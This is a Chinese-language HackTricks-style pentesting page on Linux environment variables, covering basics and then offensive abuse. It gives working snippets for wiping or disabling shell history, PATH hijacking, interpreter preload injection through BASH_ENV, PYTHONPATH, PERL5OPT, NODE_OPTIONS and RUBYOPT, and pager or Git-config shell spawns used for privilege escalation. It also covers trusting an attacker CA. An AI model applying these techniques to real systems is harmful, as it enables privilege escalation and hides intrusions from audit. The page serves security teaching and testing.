# Linux 环境变量

{{#include ../../banners/hacktricks-training.md}}

## 全局变量

全局变量**将会被**子进程**继承**。

你可以执行以下操作，为当前会话创建一个全局变量：
```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```
此变量将可供当前会话及其子进程访问。

你可以通过以下方式**删除**变量：
```bash
unset MYGLOBAL
```
## 本地变量

**本地变量**只能被**当前 shell/脚本** **访问**。
```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```
## 列出当前变量
```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```
`/proc/*/environ` 的内容使用 **NUL 分隔**，因此这些变体通常更易于阅读：
```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```
如果你正在继承的环境中寻找 **credentials** 或 **interesting service configuration**，也请检查 [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md)。

## 常见变量

来源：[https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/)。<sup>[[5]](#references)</sup>

- **DISPLAY** – **X** 使用的显示器。此变量通常设置为 **:0.0**，表示当前计算机上的第一个显示器。
- **EDITOR** – 用户偏好的文本编辑器。
- **HISTFILESIZE** – history file 中包含的最大行数。
- **HISTSIZE** – 用户结束会话时添加到 history file 的行数。
- **HOME** – 你的 home 目录。
- **HOSTNAME** – 计算机的 hostname。
- **LANG** – 当前语言。
- **MAIL** – 用户 mail spool 的位置。通常为 **/var/spool/mail/USER**。
- **MANPATH** – 用于搜索手册页的目录列表。
- **OSTYPE** – 操作系统类型。
- **PS1** – bash 中的默认提示符。
- **PATH** – 存储所有包含你希望执行的二进制文件的目录路径；这样只需指定文件名，而无需使用相对路径或绝对路径。
- **PWD** – 当前工作目录。
- **SHELL** – 当前 command shell 的路径（例如 **/bin/bash**）。
- **TERM** – 当前终端类型（例如 **xterm**）。
- **TZ** – 你的时区。
- **USER** – 当前用户名。

## 对 hacking 有用的变量

并非每个变量都同样有用。从 offensive 的角度来看，应优先关注会改变 **search paths**、**startup files**、**dynamic linker behavior** 或 **audit/logging** 的变量。

### **HISTFILESIZE**

将此 **variable 的 value 更改为 0**，这样当你 **结束 session** 时，**history file**（\~/.bash_history）将被 **截断为 0 行**。
```bash
export HISTFILESIZE=0
```
### **HISTSIZE**

将此变量的**值更改为 0**，这样命令就**不会保存在内存中的 history 中**，也不会被写回 **history 文件**（\~/.bash_history）。
```bash
export HISTSIZE=0
```
### **HISTCONTROL**

如果**此变量的值设置为 `ignorespace` 或 `ignoreboth`**，则任何前面添加了额外空格的命令都不会保存到历史记录中。
```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```
### **HISTFILE**

将 **history file** 指向 **`/dev/null`**，或完全取消设置。通常这比仅更改 history 大小更加可靠。
```bash
export HISTFILE=/dev/null
unset HISTFILE
```
### http_proxy & https_proxy

进程将使用此处声明的 **proxy**，通过 **http 或 https** 连接到 internet。
```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```
### all_proxy & no_proxy

- `all_proxy`：遵守该设置的工具/协议所使用的默认 proxy。
- `no_proxy`：应直接连接的 bypass 列表（主机/域名/CIDR）。
```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```
根据所使用的工具，可能使用小写或大写形式（`http_proxy`/`HTTP_PROXY`、`no_proxy`/`NO_PROXY`）。

### SSL_CERT_FILE & SSL_CERT_DIR

进程将信任 **这些环境变量** 中指定的证书。这可用于让 **`curl`**、**`git`**、Python HTTP 客户端或包管理器信任由攻击者控制的 CA（例如，让拦截代理看起来合法）。
```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```
### **PATH**

如果特权 wrapper/script 在执行命令时**没有使用绝对路径**，那么 `PATH` 中第一个由攻击者控制的目录将生效。这是 `sudo`、cron jobs、shell wrappers 和自定义 SUID helpers 中许多 **PATH hijacks** 的基础。查找 `env_keep+=PATH`、较弱的 `secure_path`，或按名称调用 `tar`、`service`、`cp`、`python` 等程序的 wrappers。
```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```
对于利用 `PATH` 的完整权限提升链，请查看 [Linux 权限提升](linux-privilege-escalation/README.md)。

### **HOME 与 XDG_CONFIG_HOME**

`HOME` 不仅是目录引用：许多工具会自动从 `$HOME` 或 `$XDG_CONFIG_HOME` 加载 **dotfiles**、**plugins** 和 **per-user configuration**。如果特权工作流保留这些值，那么 **config injection** 可能比 binary hijacking 更容易实现。
```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```
有趣的目标包括 `.gitconfig`、`.wgetrc`、`.curlrc`、`.inputrc`、`.pythonrc.py`，以及特定工具的文件，例如 `.terraformrc`。

### **LD_PRELOAD、LD_LIBRARY_PATH & LD_AUDIT**

这些变量会影响 **dynamic linker**：

- `LD_PRELOAD`：强制优先加载额外的 shared objects。
- `LD_LIBRARY_PATH`：将 library search directories 放在搜索路径最前面。
- `LD_AUDIT`：加载用于观察 library loading 和 symbol resolution 的 auditor libraries。

如果某个 privileged command 会保留这些变量，那么它们对于 **hooking**、**instrumentation** 和 **privilege escalation** 极具价值。在 **secure-execution** 模式（`AT_SECURE`，例如 setuid/setgid/capabilities）下，loader 会移除或限制其中许多变量。不过，早期 loader 阶段中的 parser bugs 仍然具有高影响，因为它们会在目标程序之前运行。<sup>[[2]](#references)</sup>
```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```
### **GLIBC_TUNABLES**

`GLIBC_TUNABLES` 会改变 glibc 的早期行为（例如 allocator tunables），在 exploit 实验环境中非常实用。从安全角度来看，它也很重要，因为 **dynamic loader 会在非常早期解析它**。2023 年的 **Looney Tunables** 漏洞很好地提醒了我们：在 loader 中解析的单个环境变量，可能会针对 SUID 程序变成一个**本地权限提升原语**。<sup>[[6]](#references)</sup>
```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```
### **BASH_ENV & ENV**

如果 **Bash** 以**非交互模式**启动，它会检查 `BASH_ENV`，并在运行目标脚本前加载该文件。当 Bash 以 `sh` 身份调用，或处于 POSIX 风格的交互模式时，也可能会读取 `ENV`。如果环境由攻击者控制，这是将 shell wrapper 转变为代码执行的经典方式。
```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```
Bash 会在 **real/effective IDs 不一致** 时忽略这些启动文件；`-p` 会保留 effective ID，但不会启用这些启动文件，因此确切行为取决于 wrapper 调用 shell 的方式。对于在启动 Bash **之前**调用 `setuid()`/`setgid()` 的特权 wrapper 要特别小心：一旦这些 IDs 再次匹配，Bash 可能会信任原本会被忽略的 `BASH_ENV`、`ENV` 以及相关 shell 状态。<sup>[[1]](#references)</sup>

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP & PYTHONINSPECT**

这些变量会改变 Python 的启动方式：

- `PYTHONPATH`：在 import 搜索路径前添加路径。
- `PYTHONHOME`：重新定位标准库目录树。
- `PYTHONSTARTUP`：在交互式提示符出现前执行一个文件。
- `PYTHONINSPECT=1`：脚本执行完毕后进入交互模式。

当维护脚本、debugger、shell 和 wrapper 使用可控环境调用 Python 时，这些变量很有用。`python -E` 和 `python -I` 会忽略所有 `PYTHON*` 变量。
```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode
```
一个近期的真实案例是 2024 年 Ubuntu/Debian 系统上的 **needrestart** LPE：由 root 拥有的 scanner 从 `/proc/<PID>/environ` 复制了一个非特权进程的 `PYTHONPATH`，随后执行 Python。公开的 exploit 在攻击者控制的路径中植入了 `importlib/__init__.so`，使 Python 在自身初始化期间执行攻击者代码，甚至早于 helper 的硬编码脚本发挥作用。<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Perl 也有同样实用的启动变量：

- `PERL5LIB`：预置 library 目录。
- `PERL5OPT`：注入 switches，使其表现得如同位于每条 `perl` 命令行中。

这可以强制执行**自动 module 加载**，或在目标脚本执行任何有意义的操作之前改变 interpreter 行为。Perl 在 **taint / setuid / setgid** 上下文中会忽略这些变量，但对于普通的 root-run wrappers、CI jobs、installers 和自定义 sudoers 规则，它们仍然非常重要。
```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```
### **NODE_OPTIONS**

`NODE_OPTIONS` 会将 **Node.js CLI flags** 添加到所有继承该环境的 `node` 进程前面。这使其可用于攻击 wrappers、CI jobs、Electron helpers，以及最终调用 Node 的 sudo rules。通常最有趣的 offensive flags 包括：

- `--require <file>`：在目标脚本之前预加载一个 CommonJS 文件。
- `--import <module>`：在目标脚本之前预加载一个 ES module。

Node 会拒绝 `NODE_OPTIONS` 中的一些危险 flags，但 `--require` 和 `--import` 被明确允许，并且会在常规命令行参数**之前**处理。<sup>[[4]](#references)</sup>
```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```
对于间接设置 `NODE_OPTIONS` 的 remote gadget chains（例如通过 prototype-pollution 实现 RCE），请查看[此页面](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md)。

### **RUBYLIB & RUBYOPT**

Ruby 提供了同类的启动阶段滥用方式：

- `RUBYLIB`：将目录添加到 Ruby 的加载路径前端。
- `RUBYOPT`：向每次 `ruby` 调用注入命令行选项，例如 `-r`。
```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```
2024 年的 **needrestart** vulnerabilities 表明，这并不只是实验室技巧：同一个容易受到 `PYTHONPATH` 滥用的 root-owned helper，也可以被诱导使用攻击者控制的 `RUBYLIB` 运行 Ruby，从攻击者目录加载 `enc/encdb.so`。<sup>[[3]](#references)</sup>

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

有些工具并不只是从环境中读取路径；它们还会将该值传递给 **shell**、**editor** 或 **input preprocessor**。因此，当一个 privileged wrapper 运行 `git`、`man`、`less` 或类似的文本查看器时，以下变量尤其值得关注：

- `PAGER`, `MANPAGER`, `GIT_PAGER`：选择 pager command。
- `GIT_EDITOR`, `VISUAL`, `EDITOR`：选择 editor command，通常还可包含参数。
- `LESSOPEN`, `LESSCLOSE`：定义在 `less` 打开文件时运行的 pre/post-processors。
```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```
Git 还支持通过 `GIT_CONFIG_COUNT`、`GIT_CONFIG_KEY_<n>` 和 `GIT_CONFIG_VALUE_<n>` 实现**仅通过环境变量注入配置**，而无需接触磁盘：
```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```
从 post-exploitation 的角度来看，还要记住，继承的环境通常包含 **credentials**、**proxy settings**、**service tokens** 或 **cloud keys**。查看 [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md)，了解如何检查 `/proc/<PID>/environ` 以及在 `systemd` 中寻找 `Environment=`。

### PS1

更改提示符的显示方式。

[**这是一个示例**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root：

![PERL5OPT & PERL5LIB - PS1：这是一个示例](<../images/image (897).png>)

普通用户：

![PERL5OPT & PERL5LIB - PS1：有一个、两个和三个后台作业](<../images/image (740).png>)

有一个、两个和三个后台作业：

![PERL5OPT & PERL5LIB - PS1：有一个、两个和三个后台作业](<../images/image (145).png>)

有一个后台作业、一个已停止的作业，并且上一条命令未正确完成：

![PERL5OPT & PERL5LIB - PS1：有一个后台作业、一个已停止的作业，并且上一条命令未正确完成](<../images/image (715).png>)

## References

- [1] [GNU Bash 手册 - Bash 启动文件](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - Linux 手册页](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - 需要 restart 的 LPE](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Node.js CLI 文档 - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [常见环境变量 - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911：Looney Tunables - glibc 的 ld.so 中的本地权限提升 - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
{{#include ../../banners/hacktricks-training.md}}
